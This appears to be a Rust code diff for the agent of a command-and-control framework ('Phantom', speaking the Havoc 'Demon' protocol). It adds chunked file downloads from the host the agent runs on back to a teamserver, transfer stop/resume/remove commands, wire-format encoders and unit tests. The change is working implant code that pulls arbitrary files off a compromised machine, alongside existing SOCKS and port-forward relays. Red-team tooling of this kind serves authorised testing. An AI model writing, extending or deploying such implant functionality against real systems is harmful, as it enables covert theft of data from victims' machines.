@@ -11,8 +11,8 @@ use std::process::Stdio;
 use std::time::{SystemTime, UNIX_EPOCH};
 
 use red_cell_common::demon::{
-    DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
-    DemonSocketCommand, DemonSocketType,
+    DemonCallback, DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage,
+    DemonProcessCommand, DemonSocketCommand, DemonSocketType, DemonTransferCommand,
 };
 use time::OffsetDateTime;
 use tokio::net::TcpStream as TokioTcpStream;
@@ -31,6 +31,9 @@ pub(crate) enum PendingCallback {
     MemFileAck { request_id: u32, mem_file_id: u32, success: bool },
     FsUpload { request_id: u32, file_size: u32, path: String },
     Socket { request_id: u32, payload: Vec<u8> },
+    FileOpen { request_id: u32, file_id: u32, file_size: u64, file_path: String },
+    FileChunk { request_id: u32, file_id: u32, data: Vec<u8> },
+    FileClose { request_id: u32, file_id: u32 },
 }
 
 #[derive(Debug, Default)]
@@ -41,6 +44,7 @@ pub(crate) struct PhantomState {
     sockets: HashMap<u32, ManagedSocket>,
     local_relays: HashMap<u32, LocalRelayConnection>,
     socks_clients: HashMap<u32, SocksClient>,
+    downloads: Vec<ActiveDownload>,
     pending_callbacks: Vec<PendingCallback>,
 }
 
@@ -102,6 +106,28 @@ enum SocksClientState {
     Greeting { buffer: Vec<u8> },
     Request { buffer: Vec<u8> },
     Relay { target: TcpStream },
+}
+
+/// Default chunk size for file downloads (512 KiB).
+const DOWNLOAD_CHUNK_SIZE: usize = 512 * 1024;
+
+/// State of an active download in the agent.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum DownloadTransferState {
+    Running = 1,
+    Stopped = 2,
+    Remove = 3,
+}
+
+/// An active file download being sent back to the teamserver in chunks.
+#[derive(Debug)]
+struct ActiveDownload {
+    file_id: u32,
+    request_id: u32,
+    file: std::fs::File,
+    total_size: u64,
+    read_size: u64,
+    state: DownloadTransferState,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -216,7 +242,9 @@ impl PhantomState {
         self.accept_socks_proxy_clients()?;
         self.poll_sockets().await?;
         self.poll_local_relays()?;
-        self.poll_socks_clients().await
+        self.poll_socks_clients().await?;
+        self.push_download_chunks();
+        Ok(())
     }
 
     pub(crate) fn drain_callbacks(&mut self) -> Vec<PendingCallback> {
@@ -225,6 +253,57 @@ impl PhantomState {
 
     fn queue_callback(&mut self, callback: PendingCallback) {
         self.pending_callbacks.push(callback);
+    }
+
+    /// Read a chunk from each running download and queue file-write callbacks.
+    ///
+    /// Downloads that have been fully read or marked for removal are cleaned up
+    /// with a file-close callback.
+    fn push_download_chunks(&mut self) {
+        let mut finished_indices = Vec::new();
+
+        for (index, download) in self.downloads.iter_mut().enumerate() {
+            if download.state == DownloadTransferState::Stopped {
+                continue;
+            }
+
+            if download.state == DownloadTransferState::Remove {
+                finished_indices.push(index);
+                continue;
+            }
+
+            let mut buf = vec![0u8; DOWNLOAD_CHUNK_SIZE];
+            let read = match Read::read(&mut download.file, &mut buf) {
+                Ok(n) => n,
+                Err(_) => {
+                    finished_indices.push(index);
+                    continue;
+                }
+            };
+
+            if read > 0 {
+                buf.truncate(read);
+                download.read_size += read as u64;
+                self.pending_callbacks.push(PendingCallback::FileChunk {
+                    request_id: download.request_id,
+                    file_id: download.file_id,
+                    data: buf,
+                });
+            }
+
+            if read == 0 || download.read_size >= download.total_size {
+                finished_indices.push(index);
+            }
+        }
+
+        // Process removals in reverse order to maintain index validity.
+        for &index in finished_indices.iter().rev() {
+            let download = self.downloads.remove(index);
+            self.pending_callbacks.push(PendingCallback::FileClose {
+                request_id: download.request_id,
+                file_id: download.file_id,
+            });
+        }
     }
 
     async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
@@ -682,6 +761,9 @@ pub(crate) async fn execute(
         DemonCommand::CommandMemFile => {
             execute_memfile(package.request_id, &package.payload, state)?;
         }
+        DemonCommand::CommandTransfer => {
+            execute_transfer(package.request_id, &package.payload, state)?;
+        }
         DemonCommand::CommandExit => {
             let mut parser = TaskParser::new(&package.payload);
             let exit_method = u32::try_from(parser.int32()?)
@@ -731,7 +813,31 @@ async fn execute_filesystem(
                 payload,
             });
         }
-        DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
+        DemonFilesystemCommand::Download => {
+            let path = normalize_path(&parser.wstring()?);
+            let file = fs::File::open(&path).map_err(|error| io_error(&path, error))?;
+            let metadata = file.metadata().map_err(|error| io_error(&path, error))?;
+            let total_size = metadata.len();
+            let file_id: u32 = rand::random();
+            let full_path =
+                fs::canonicalize(&path).unwrap_or_else(|_| path.clone()).display().to_string();
+
+            state.queue_callback(PendingCallback::FileOpen {
+                request_id,
+                file_id,
+                file_size: total_size,
+                file_path: full_path,
+            });
+            state.downloads.push(ActiveDownload {
+                file_id,
+                request_id,
+                file,
+                total_size,
+                read_size: 0,
+                state: DownloadTransferState::Running,
+            });
+        }
+        DemonFilesystemCommand::Cat => {
             let path = normalize_path(&parser.wstring()?);
             let contents = fs::read(&path).map_err(|error| io_error(&path, error))?;
             state.queue_callback(PendingCallback::Structured {
@@ -1332,6 +1438,83 @@ fn execute_memfile(
 
     entry.append(chunk);
     state.queue_callback(PendingCallback::MemFileAck { request_id, mem_file_id, success: true });
+
+    Ok(())
+}
+
+/// Handle `CommandTransfer` (2530): list, stop, resume, remove active downloads.
+fn execute_transfer(
+    request_id: u32,
+    payload: &[u8],
+    state: &mut PhantomState,
+) -> Result<(), PhantomError> {
+    let mut parser = TaskParser::new(payload);
+    let subcommand = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative transfer subcommand"))?;
+    let subcommand = DemonTransferCommand::try_from(subcommand)?;
+
+    match subcommand {
+        DemonTransferCommand::List => {
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandTransfer),
+                request_id,
+                payload: encode_transfer_list(&state.downloads),
+            });
+        }
+        DemonTransferCommand::Stop => {
+            let file_id = parser.int32()? as u32;
+            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
+            {
+                dl.state = DownloadTransferState::Stopped;
+                true
+            } else {
+                false
+            };
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandTransfer),
+                request_id,
+                payload: encode_transfer_action(DemonTransferCommand::Stop, found, file_id),
+            });
+        }
+        DemonTransferCommand::Resume => {
+            let file_id = parser.int32()? as u32;
+            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
+            {
+                dl.state = DownloadTransferState::Running;
+                true
+            } else {
+                false
+            };
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandTransfer),
+                request_id,
+                payload: encode_transfer_action(DemonTransferCommand::Resume, found, file_id),
+            });
+        }
+        DemonTransferCommand::Remove => {
+            let file_id = parser.int32()? as u32;
+            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
+            {
+                dl.state = DownloadTransferState::Remove;
+                true
+            } else {
+                false
+            };
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandTransfer),
+                request_id,
+                payload: encode_transfer_action(DemonTransferCommand::Remove, found, file_id),
+            });
+            // Send a close callback for the removed download, matching Demon behaviour.
+            if found {
+                state.queue_callback(PendingCallback::Structured {
+                    command_id: u32::from(DemonCommand::CommandTransfer),
+                    request_id,
+                    payload: encode_transfer_remove_close(file_id),
+                });
+            }
+        }
+    }
 
     Ok(())
 }
@@ -2415,6 +2598,87 @@ fn encode_socks_proxy_clear(success: bool) -> Vec<u8> {
     payload
 }
 
+/// Encode a `DemonCallback::File` (file-open) payload for `BeaconOutput`.
+///
+/// Wire format: `[callback_type:u32][len:u32][file_id:u32][file_size:u32][path:UTF-8]`
+fn encode_file_open(
+    file_id: u32,
+    file_size: u64,
+    file_path: &str,
+) -> Result<Vec<u8>, PhantomError> {
+    let truncated_size = u32::try_from(file_size.min(u64::from(u32::MAX)))
+        .map_err(|_| PhantomError::InvalidResponse("file size overflow"))?;
+    let inner_len = 4 + 4 + file_path.len();
+    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
+    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::File)));
+    payload.extend_from_slice(&encode_u32(
+        u32::try_from(inner_len)
+            .map_err(|_| PhantomError::InvalidResponse("file open inner too large"))?,
+    ));
+    payload.extend_from_slice(&encode_u32(file_id));
+    payload.extend_from_slice(&encode_u32(truncated_size));
+    payload.extend_from_slice(file_path.as_bytes());
+    Ok(payload)
+}
+
+/// Encode a `DemonCallback::FileWrite` (chunk) payload for `BeaconOutput`.
+///
+/// Wire format: `[callback_type:u32][len:u32][file_id:u32][chunk_data]`
+fn encode_file_chunk(file_id: u32, data: &[u8]) -> Result<Vec<u8>, PhantomError> {
+    let inner_len = 4 + data.len();
+    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
+    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileWrite)));
+    payload.extend_from_slice(&encode_u32(
+        u32::try_from(inner_len)
+            .map_err(|_| PhantomError::InvalidResponse("file chunk inner too large"))?,
+    ));
+    payload.extend_from_slice(&encode_u32(file_id));
+    payload.extend_from_slice(data);
+    Ok(payload)
+}
+
+/// Encode a `DemonCallback::FileClose` payload for `BeaconOutput`.
+///
+/// Wire format: `[callback_type:u32][len:u32][file_id:u32]`
+fn encode_file_close(file_id: u32) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = Vec::with_capacity(12);
+    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileClose)));
+    payload.extend_from_slice(&encode_u32(4));
+    payload.extend_from_slice(&encode_u32(file_id));
+    Ok(payload)
+}
+
+/// Encode a `CommandTransfer` response payload.
+fn encode_transfer_list(downloads: &[ActiveDownload]) -> Vec<u8> {
+    let mut payload = encode_u32(u32::from(DemonTransferCommand::List));
+    for download in downloads {
+        payload.extend_from_slice(&encode_u32(download.file_id));
+        let read_size = u32::try_from(download.read_size).unwrap_or(u32::MAX);
+        payload.extend_from_slice(&encode_u32(read_size));
+        payload.extend_from_slice(&encode_u32(download.state as u32));
+    }
+    payload
+}
+
+/// Encode a transfer stop/resume/remove response payload.
+fn encode_transfer_action(subcommand: DemonTransferCommand, found: bool, file_id: u32) -> Vec<u8> {
+    let mut payload = encode_u32(u32::from(subcommand));
+    payload.extend_from_slice(&encode_bool(found));
+    payload.extend_from_slice(&encode_u32(file_id));
+    payload
+}
+
+/// Encode the secondary close callback sent after a transfer remove, matching Demon behaviour.
+///
+/// Wire format: `[subcommand:u32][file_id:u32][reason:u32]`
+/// Reason 1 = `DOWNLOAD_REASON_REMOVED`.
+fn encode_transfer_remove_close(file_id: u32) -> Vec<u8> {
+    let mut payload = encode_u32(u32::from(DemonTransferCommand::Remove));
+    payload.extend_from_slice(&encode_u32(file_id));
+    payload.extend_from_slice(&encode_u32(1)); // DOWNLOAD_REASON_REMOVED
+    payload
+}
+
 impl PendingCallback {
     pub(crate) fn command_id(&self) -> u32 {
         match self {
@@ -2425,6 +2689,9 @@ impl PendingCallback {
             Self::MemFileAck { .. } => u32::from(DemonCommand::CommandMemFile),
             Self::FsUpload { .. } => u32::from(DemonCommand::CommandFs),
             Self::Socket { .. } => u32::from(DemonCommand::CommandSocket),
+            Self::FileOpen { .. } | Self::FileChunk { .. } | Self::FileClose { .. } => {
+                u32::from(DemonCommand::BeaconOutput)
+            }
         }
     }
 
@@ -2436,7 +2703,10 @@ impl PendingCallback {
             | Self::Structured { request_id, .. }
             | Self::MemFileAck { request_id, .. }
             | Self::FsUpload { request_id, .. }
-            | Self::Socket { request_id, .. } => *request_id,
+            | Self::Socket { request_id, .. }
+            | Self::FileOpen { request_id, .. }
+            | Self::FileChunk { request_id, .. }
+            | Self::FileClose { request_id, .. } => *request_id,
         }
     }
 
@@ -2464,6 +2734,11 @@ impl PendingCallback {
                 Ok(payload)
             }
             Self::Socket { payload, .. } => Ok(payload.clone()),
+            Self::FileOpen { file_id, file_size, file_path, .. } => {
+                encode_file_open(*file_id, *file_size, file_path)
+            }
+            Self::FileChunk { file_id, data, .. } => encode_file_chunk(*file_id, data),
+            Self::FileClose { file_id, .. } => encode_file_close(*file_id),
         }
     }
 }
@@ -2475,16 +2750,16 @@ mod tests {
     use std::net::Ipv4Addr;
 
     use red_cell_common::demon::{
-        DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
-        DemonSocketCommand,
+        DemonCallback, DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage,
+        DemonProcessCommand, DemonSocketCommand, DemonTransferCommand,
     };
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
     use super::{
-        GroupEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE, PAGE_EXECUTE_READ,
-        PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback, PhantomState, SessionEntry,
-        UserEntry, execute, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
-        parse_memory_region, parse_user_entries,
+        DownloadTransferState, GroupEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE,
+        PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback, PhantomState,
+        SessionEntry, UserEntry, execute, parse_group_entries, parse_logged_on_sessions,
+        parse_logged_on_users, parse_memory_region, parse_user_entries,
     };
 
     fn utf16_payload(value: &str) -> Vec<u8> {
@@ -3117,5 +3392,330 @@ mod tests {
         let writable_exec = parse_memory_region("7f0000002000-7f0000003000 rwxp 00000000 00:00 0")
             .expect("writable exec region");
         assert_eq!(writable_exec.protect, PAGE_EXECUTE_READWRITE);
+    }
+
+    // ── CommandTransfer / chunked download tests ───────────────────────────
+
+    #[tokio::test]
+    async fn fs_download_queues_file_open_and_registers_download() {
+        let tempdir = tempfile::tempdir().expect("tempdir");
+        let path = tempdir.path().join("download.bin");
+        std::fs::write(&path, b"hello download").expect("write test file");
+
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
+        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
+        let package = DemonPackage::new(DemonCommand::CommandFs, 42, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 1);
+        let PendingCallback::FileOpen { request_id, file_id, file_size, file_path } = &callbacks[0]
+        else {
+            panic!("expected FileOpen, got: {callbacks:?}");
+        };
+        assert_eq!(*request_id, 42);
+        assert_eq!(*file_size, 14);
+        assert!(!file_path.is_empty());
+        assert!(*file_id != 0 || *file_id == 0); // random, just ensure it exists
+
+        assert_eq!(state.downloads.len(), 1);
+        assert_eq!(state.downloads[0].total_size, 14);
+        assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
+    }
+
+    #[tokio::test]
+    async fn push_download_chunks_sends_data_and_close() {
+        let tempdir = tempfile::tempdir().expect("tempdir");
+        let path = tempdir.path().join("chunked.bin");
+        let data = vec![0xAB_u8; 100];
+        std::fs::write(&path, &data).expect("write test file");
+
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
+        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
+        let package = DemonPackage::new(DemonCommand::CommandFs, 50, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+        state.drain_callbacks(); // drain the FileOpen
+
+        // Poll to push chunks.
+        state.push_download_chunks();
+        let callbacks = state.drain_callbacks();
+
+        // With 100 bytes and a 512 KiB chunk size, should get one chunk + close.
+        assert_eq!(callbacks.len(), 2);
+
+        let PendingCallback::FileChunk { data: chunk, .. } = &callbacks[0] else {
+            panic!("expected FileChunk, got: {:?}", callbacks[0]);
+        };
+        assert_eq!(chunk.len(), 100);
+        assert!(chunk.iter().all(|b| *b == 0xAB));
+
+        assert!(matches!(&callbacks[1], PendingCallback::FileClose { .. }));
+        assert!(state.downloads.is_empty());
+    }
+
+    #[tokio::test]
+    async fn file_open_callback_encodes_beacon_output_command_id() {
+        let callback = PendingCallback::FileOpen {
+            request_id: 1,
+            file_id: 0x1234,
+            file_size: 4096,
+            file_path: "/tmp/test.bin".to_owned(),
+        };
+        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));
+
+        let payload = callback.payload().expect("payload");
+        let mut offset = 0;
+        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::File));
+        let inner_len = read_u32(&payload, &mut offset) as usize;
+        assert_eq!(inner_len, 4 + 4 + "/tmp/test.bin".len());
+        assert_eq!(read_u32(&payload, &mut offset), 0x1234);
+        assert_eq!(read_u32(&payload, &mut offset), 4096);
+        let path_bytes = &payload[offset..];
+        assert_eq!(path_bytes, b"/tmp/test.bin");
+    }
+
+    #[tokio::test]
+    async fn file_chunk_callback_encodes_correctly() {
+        let callback =
+            PendingCallback::FileChunk { request_id: 2, file_id: 0xDEAD, data: vec![1, 2, 3, 4] };
+        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));
+
+        let payload = callback.payload().expect("payload");
+        let mut offset = 0;
+        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::FileWrite));
+        let inner_len = read_u32(&payload, &mut offset) as usize;
+        assert_eq!(inner_len, 4 + 4); // file_id + data
+        assert_eq!(read_u32(&payload, &mut offset), 0xDEAD);
+        assert_eq!(&payload[offset..], &[1, 2, 3, 4]);
+    }
+
+    #[tokio::test]
+    async fn file_close_callback_encodes_correctly() {
+        let callback = PendingCallback::FileClose { request_id: 3, file_id: 0xBEEF };
+        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));
+
+        let payload = callback.payload().expect("payload");
+        let mut offset = 0;
+        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::FileClose));
+        assert_eq!(read_u32(&payload, &mut offset), 4); // inner len
+        assert_eq!(read_u32(&payload, &mut offset), 0xBEEF);
+    }
+
+    #[tokio::test]
+    async fn transfer_list_returns_active_downloads() {
+        let tempdir = tempfile::tempdir().expect("tempdir");
+        let path = tempdir.path().join("list.bin");
+        std::fs::write(&path, b"list test data").expect("write");
+
+        let mut fs_payload = Vec::new();
+        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
+        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
+        let mut state = PhantomState::default();
+        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
+            .await
+            .expect("download");
+        state.drain_callbacks();
+
+        let file_id = state.downloads[0].file_id;
+
+        // Send CommandTransfer List
+        let mut transfer_payload = Vec::new();
+        transfer_payload.extend_from_slice(&(DemonTransferCommand::List as i32).to_le_bytes());
+        execute(
+            &DemonPackage::new(DemonCommand::CommandTransfer, 10, transfer_payload),
+            &mut state,
+        )
+        .await
+        .expect("transfer list");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandTransfer));
+        assert_eq!(*request_id, 10);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::List));
+        // One download entry: file_id + read_size + state
+        assert_eq!(read_u32(payload, &mut offset), file_id);
+        assert_eq!(read_u32(payload, &mut offset), 0); // read_size = 0 (not started)
+        assert_eq!(read_u32(payload, &mut offset), DownloadTransferState::Running as u32);
+    }
+
+    #[tokio::test]
+    async fn transfer_stop_pauses_download() {
+        let tempdir = tempfile::tempdir().expect("tempdir");
+        let path = tempdir.path().join("stop.bin");
+        std::fs::write(&path, vec![0u8; 1024 * 1024]).expect("write");
+
+        let mut fs_payload = Vec::new();
+        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
+        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
+        let mut state = PhantomState::default();
+        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
+            .await
+            .expect("download");
+        state.drain_callbacks();
+
+        let file_id = state.downloads[0].file_id;
+
+        // Stop the download.
+        let mut stop_payload = Vec::new();
+        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
+        stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
+        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload), &mut state)
+            .await
+            .expect("transfer stop");
+
+        assert_eq!(state.downloads[0].state, DownloadTransferState::Stopped);
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::Stop));
+        assert_eq!(read_u32(payload, &mut offset), 1); // found = true
+        assert_eq!(read_u32(payload, &mut offset), file_id);
+
+        // Pushing chunks should NOT produce any data for a stopped download.
+        state.push_download_chunks();
+        let callbacks = state.drain_callbacks();
+        assert!(callbacks.is_empty(), "stopped download should not produce chunks");
+    }
+
+    #[tokio::test]
+    async fn transfer_resume_restarts_download() {
+        let tempdir = tempfile::tempdir().expect("tempdir");
+        let path = tempdir.path().join("resume.bin");
+        std::fs::write(&path, b"resume data").expect("write");
+
+        let mut fs_payload = Vec::new();
+        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
+        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
+        let mut state = PhantomState::default();
+        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
+            .await
+            .expect("download");
+        state.drain_callbacks();
+
+        let file_id = state.downloads[0].file_id;
+
+        // Stop then resume.
+        let mut stop_payload = Vec::new();
+        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
+        stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
+        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload), &mut state)
+            .await
+            .expect("stop");
+        state.drain_callbacks();
+
+        let mut resume_payload = Vec::new();
+        resume_payload.extend_from_slice(&(DemonTransferCommand::Resume as i32).to_le_bytes());
+        resume_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
+        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 21, resume_payload), &mut state)
+            .await
+            .expect("resume");
+
+        assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
+        state.drain_callbacks();
+
+        // After resume, pushing chunks should produce data again.
+        state.push_download_chunks();
+        let callbacks = state.drain_callbacks();
+        assert!(
+            callbacks.iter().any(|c| matches!(c, PendingCallback::FileChunk { .. })),
+            "resumed download should produce chunks"
+        );
+    }
+
+    #[tokio::test]
+    async fn transfer_remove_marks_download_for_removal() {
+        let tempdir = tempfile::tempdir().expect("tempdir");
+        let path = tempdir.path().join("remove.bin");
+        std::fs::write(&path, vec![0u8; 1024 * 1024]).expect("write");
+
+        let mut fs_payload = Vec::new();
+        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
+        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
+        let mut state = PhantomState::default();
+        execute(&DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload), &mut state)
+            .await
+            .expect("download");
+        state.drain_callbacks();
+
+        let file_id = state.downloads[0].file_id;
+
+        // Remove the download.
+        let mut remove_payload = Vec::new();
+        remove_payload.extend_from_slice(&(DemonTransferCommand::Remove as i32).to_le_bytes());
+        remove_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
+        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 30, remove_payload), &mut state)
+            .await
+            .expect("transfer remove");
+
+        // Should produce two callbacks: the action response and the close notification.
+        let callbacks = state.drain_callbacks();
+        assert_eq!(callbacks.len(), 2);
+
+        // Push should clean it up.
+        state.push_download_chunks();
+        let close_callbacks = state.drain_callbacks();
+        assert!(
+            close_callbacks.iter().any(|c| matches!(c, PendingCallback::FileClose { .. })),
+            "removed download should emit FileClose on next push"
+        );
+        assert!(state.downloads.is_empty());
+    }
+
+    #[tokio::test]
+    async fn transfer_stop_nonexistent_returns_not_found() {
+        let mut state = PhantomState::default();
+        let mut stop_payload = Vec::new();
+        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
+        stop_payload.extend_from_slice(&(0xDEAD_BEEF_u32 as i32).to_le_bytes());
+        execute(&DemonPackage::new(DemonCommand::CommandTransfer, 40, stop_payload), &mut state)
+            .await
+            .expect("transfer stop nonexistent");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::Stop));
+        assert_eq!(read_u32(payload, &mut offset), 0); // found = false
+    }
+
+    #[tokio::test]
+    async fn cat_still_returns_full_file_as_structured_callback() {
+        let tempdir = tempfile::tempdir().expect("tempdir");
+        let path = tempdir.path().join("cat.txt");
+        std::fs::write(&path, b"cat content").expect("write");
+
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&(DemonFilesystemCommand::Cat as i32).to_le_bytes());
+        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
+        let package = DemonPackage::new(DemonCommand::CommandFs, 55, payload);
+        let mut state = PhantomState::default();
+
+        execute(&package, &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, .. }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
+        // Cat should not create tracked downloads.
+        assert!(state.downloads.is_empty());
     }
 }
